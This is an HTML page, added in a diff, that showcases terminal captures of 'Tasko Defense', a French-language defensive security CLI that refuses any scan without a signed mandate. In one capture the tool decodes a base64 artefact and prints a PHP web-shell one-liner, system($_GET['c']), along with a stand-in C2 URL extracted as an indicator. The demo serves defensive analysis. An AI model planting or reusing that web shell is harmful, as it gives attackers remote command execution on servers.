@@ -1,0 +1,231 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Tasko Defense — aperçu</title>
+<meta name="description" content="Captures réelles des interfaces en ligne de commande de Tasko Defense.">
+<style>
+  :root {
+    --bg:#0f1419; --panel:#1b2330; --panel2:#11161f; --fg:#e6edf3; --muted:#9bb0c3;
+    --accent:#5ad1a0; --warn:#e3b341; --term:#0b0f14; --border:#273244;
+  }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--bg); color:var(--fg);
+    font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; line-height:1.5; }
+  header { padding:28px 16px 8px; max-width:920px; margin:0 auto; }
+  h1 { margin:0 0 6px; font-size:1.5rem; }
+  .lede { color:var(--muted); margin:0 0 4px; }
+  .note { background:var(--panel2); border:1px solid var(--border); border-left:3px solid var(--accent);
+    border-radius:8px; padding:10px 14px; color:var(--muted); font-size:.92rem; margin:14px 0; }
+  main { max-width:920px; margin:0 auto; padding:8px 16px 48px; display:grid; gap:18px; }
+  .card { background:var(--panel); border:1px solid var(--border); border-radius:12px; overflow:hidden; }
+  .bar { display:flex; align-items:center; gap:8px; padding:10px 14px; background:var(--panel2);
+    border-bottom:1px solid var(--border); }
+  .dot { width:11px; height:11px; border-radius:50%; display:inline-block; }
+  .dot.r{background:#ff5f57} .dot.y{background:#febc2e} .dot.g{background:#28c840}
+  .btitle { margin-left:8px; font-weight:600; font-size:.95rem; }
+  .badge { margin-left:auto; font-size:.72rem; padding:2px 8px; border-radius:999px;
+    font-family:ui-monospace,Menlo,Consolas,monospace; }
+  .badge.ok { background:rgba(90,209,160,.15); color:var(--accent); }
+  .badge.warn { background:rgba(227,179,65,.15); color:var(--warn); }
+  .desc { margin:0; padding:10px 14px; color:var(--muted); font-size:.9rem;
+    border-bottom:1px solid var(--border); }
+  .term { margin:0; padding:14px 16px; background:var(--term); color:#cfe3d6; overflow:auto;
+    font-family:ui-monospace,Menlo,Consolas,"Liberation Mono",monospace; font-size:.84rem;
+    white-space:pre-wrap; word-break:break-word; }
+  .prompt { color:var(--accent); font-weight:700; }
+  .cmd { color:#9fd7ff; }
+  footer { max-width:920px; margin:0 auto; padding:0 16px 40px; color:var(--muted); font-size:.85rem; }
+</style>
+</head>
+<body>
+<header>
+  <h1>Tasko Defense — aperçu des interfaces</h1>
+  <p class="lede">Boîte à outils de sécurité <strong>défensive</strong>, cadrée par un mandat.</p>
+  <div class="note">
+    Tasko Defense est un outil <strong>en ligne de commande</strong> : il n'a pas d'interface
+    graphique. Les captures ci-dessous sont des <strong>sorties réelles du terminal</strong>
+    (exécutées en local, avec de faux outils sur 127.0.0.1, aucun scan réel).
+  </div>
+</header>
+<main>
+
+    <section class="card">
+      <div class="bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+        <span class="btitle">Aide générale</span>
+        <span class="badge ok">exit 0</span></div>
+      <p class="desc">Le point d&#x27;entrée unique : toutes les sous-commandes.</p>
+      <pre class="term"><span class="prompt">$</span> <span class="cmd">python3 -m tasko.cli --help</span>
+usage: tasko [-h] [--version]
+             {verifier,info,nouveau-mandat,journaliser,journal,rapport,poc,poc-brouillon,purple,preuve}
+             ...
+
+Tasko Defense — outils cadrés par mandat
+
+positional arguments:
+  {verifier,info,nouveau-mandat,journaliser,journal,rapport,poc,poc-brouillon,purple,preuve}
+    verifier            autorise (ou non) un test sur une cible
+    info                résume un mandat
+    nouveau-mandat      crée un mandat machine (non signé) depuis le gabarit
+    journaliser         ajoute une entrée au journal des tests
+    journal             restitue le journal en Annexe C (Markdown)
+    rapport             agrège un dossier de scans en rapport client
+    poc                 documente et scelle une PoC sous Annexe D (n&#x27;exécute
+                        rien)
+    poc-brouillon       génère un brouillon de PoC pré-rempli depuis un
+                        finding de scan
+    purple              rejoue des sondes inertes pour valider la détection
+    preuve              décode/désobfusque un artefact détenu (défensif, hors
+                        ligne)
+
+options:
+  -h, --help            show this help message and exit
+  --version             show program&#x27;s version number and exit</pre>
+    </section>
+    <section class="card">
+      <div class="bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+        <span class="btitle">Résumer un mandat</span>
+        <span class="badge ok">exit 0</span></div>
+      <p class="desc">Lecture d&#x27;un mandat lisible par machine et de ses champs.</p>
+      <pre class="term"><span class="prompt">$</span> <span class="cmd">python3 -m tasko.cli info --mandat mandats/exemple.mandat.yaml</span>
+Référence     : TASKO-2026-exemple-001
+Signé         : NON (aucun test autorisé)
+Validité      : 2026-01-01 → 2026-12-31  (Africa/Ndjamena)
+Fenêtres      : 1 définie(s)
+IP source     : 198.51.100.10
+Domaines      : exemple.cm
+IPs/plages    : (aucune)
+Hébergt dédié : non
+Tests actifs  : decouverte, scan_web
+Annexe D      : non signée</pre>
+    </section>
+    <section class="card">
+      <div class="bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+        <span class="btitle">Le verrou en action (refus)</span>
+        <span class="badge warn">exit 2</span></div>
+      <p class="desc">Un mandat non signé refuse tout test : rien n&#x27;est scanné.</p>
+      <pre class="term"><span class="prompt">$</span> <span class="cmd">python3 -m tasko.cli verifier --mandat mandats/tchadone.mandat.yaml --cible https://tchadone.com/ --type sc…</span>
+[REFUSÉ] TASKO-2026-tchadone-001 :: mandat NON signé : aucun test autorisé</pre>
+    </section>
+    <section class="card">
+      <div class="bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+        <span class="btitle">Décodage de preuve</span>
+        <span class="badge ok">exit 0</span></div>
+      <p class="desc">Décode un payload obscurci (ici base64) pour comprendre l&#x27;attaque.</p>
+      <pre class="term"><span class="prompt">$</span> <span class="cmd">python3 -m tasko.cli preuve --texte PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyAvLyBodHRwOi8vYzIuZXZpbC5leGFtcGxlL3g…</span>
+# Analyse de preuve — décodage défensif
+
+**Origine :** &lt;texte&gt;  
+**Taille entrée :** 76 octets  
+**Couches décodées :** 1  
+
+&gt; Décodage/désobfuscation d&#x27;un artefact détenu, pour COMPRENDRE l&#x27;attaque.
+&gt; Aucun cassage de secret, aucun déchiffrement par clé, aucune exécution.
+
+## Couches décodées
+
+1. **gzip+base64 / base64** → `&lt;?php system($_GET[&#x27;c&#x27;]); // http://c2.evil.example/x ?&gt;`
+
+## Contenu final révélé
+
+```
+&lt;?php system($_GET[&#x27;c&#x27;]); // http://c2.evil.example/x ?&gt;
+```
+
+## Comportement apparent
+
+- system
+
+## IOC extraits
+
+- **URL :** http://c2.evil.example/x
+</pre>
+    </section>
+    <section class="card">
+      <div class="bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+        <span class="btitle">Brouillon de PoC pré-rempli</span>
+        <span class="badge ok">exit 0</span></div>
+      <p class="desc">Liste les findings d&#x27;un scan pour pré-remplir une PoC (Annexe D).</p>
+      <pre class="term"><span class="prompt">$</span> <span class="cmd">python3 -m tasko.cli poc-brouillon --dossier /tmp/demo/rapports</span>
+2 finding(s) — relance avec --finding &lt;N&gt; pour pré-remplir :
+  1. [élevée] SQL Injection — https://demo.local/login [sqli | CVE-2024-0001]
+  2. [moyenne] TLS 1.0 actif — https://demo.local [tls-old]</pre>
+    </section>
+    <section class="card">
+      <div class="bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+        <span class="btitle">Rapport client agrégé</span>
+        <span class="badge ok">exit 0</span></div>
+      <p class="desc">Agrège les findings en rapport trié par sévérité (Article 6).</p>
+      <pre class="term"><span class="prompt">$</span> <span class="cmd">python3 -m tasko.cli rapport --dossier /tmp/demo/rapports</span>
+# Rapport d&#x27;audit de sécurité — Tasko Defense
+
+
+&gt; But de ce rapport : **corriger** les vulnérabilités, jamais les exploiter.
+
+## Synthèse
+
+| Sévérité | Nombre |
+|---|---|
+| Critique | 0 |
+| Élevée | 1 |
+| Moyenne | 1 |
+| Faible | 0 |
+| Info | 0 |
+| **Total** | **2** |
+
+## Findings (du plus grave au plus faible)
+
+### 1. [ÉLEVÉE] SQL Injection
+
+- **Cible :** https://demo.local/login
+- **Outil :** nuclei
+- **Référence :** sqli | CVE-2024-0001
+- **Recommandation :** Corriger selon les bonnes pratiques de l&#x27;éditeur.
+
+### 2. [MOYENNE] TLS 1.0 actif
+
+- **Cible :** https://demo.local
+- **Outil :** nuclei
+- **Référence :** tls-old
+- **Recommandation :** Corriger selon les bonnes pratiques de l&#x27;éditeur.
+
+---
+
+*Un audit reflète l&#x27;état de sécurité au moment du test, dans les limites du mandat.*</pre>
+    </section>
+    <section class="card">
+      <div class="bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+        <span class="btitle">Mode purple : mandat exigé</span>
+        <span class="badge warn">exit 2</span></div>
+      <p class="desc">Toute cible exige un mandat — même le honeypot local.</p>
+      <pre class="term"><span class="prompt">$</span> <span class="cmd">python3 -m tasko.cli purple --cible http://127.0.0.1:8080/</span>
+usage: tasko purple [-h] --cible CIBLE --mandat MANDAT [--ip-source IP_SOURCE]
+                    [--journal JOURNAL] [--reference REFERENCE]
+                    [--honeypot-log HONEYPOT_LOG] [--pause PAUSE] [--ssh]
+                    [--ssh-port SSH_PORT] [--sortie SORTIE]
+tasko purple: error: the following arguments are required: --mandat</pre>
+    </section>
+    <section class="card">
+      <div class="bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+        <span class="btitle">Audit de parc (lot)</span>
+        <span class="badge ok">exit 0</span></div>
+      <p class="desc">Scanne tout un inventaire ; hors mandat = ignoré (jamais scanné).</p>
+      <pre class="term"><span class="prompt">$</span> <span class="cmd">bash outils/scan/audit-parc.sh /tmp/demo/parc.txt reseau</span>
+=== Audit de parc (reseau) : 20261015-205323 ===
+Mandat : /tmp/demo/local.mandat.yaml (DEMO-LOCAL)
+
+  [SCAN] 127.0.0.1
+  [IGNORÉ hors mandat] 8.8.8.8
+
+=== Terminé : 2 cible(s) | 1 scannée(s) | 1 ignorée(s) hors mandat | 0 échec(s) ===
+Résultats : tasko-defense/outils/scan/audits-parc/20261015-205323
+Journal (Annexe C) : tasko-defense/outils/scan/audits-parc/20261015-205323/annexe-C-journal.md</pre>
+    </section>
+</main>
+<footer>
+  Généré depuis le paquet tasko-defense. Le verrou de mandat, le décodage de preuve et l'audit
+  de parc fonctionnent sans aucun moteur d'exploitation : on trouve et on documente, on n'attaque pas.
+</footer>
+</body>
+</html>
